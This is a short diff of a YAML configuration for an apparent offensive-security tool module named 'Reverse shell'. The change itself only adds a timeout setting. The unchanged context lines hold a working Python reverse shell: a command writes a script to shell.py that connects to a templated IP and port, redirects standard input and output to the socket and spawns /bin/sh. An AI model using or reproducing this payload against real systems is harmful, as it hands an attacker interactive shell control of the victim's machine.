@@ -1,5 +1,6 @@
 settings:
   name: Reverse shell
+  timeout: 60
 
 reverse_shell_script:
 - [ "echo \"import sys\nimport socket\nimport os\nimport pty\ns=socket.socket()\ns.connect((\\\"$(IP)\\\",$(PORT)))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn('/bin/sh')\" > shell.py" ]
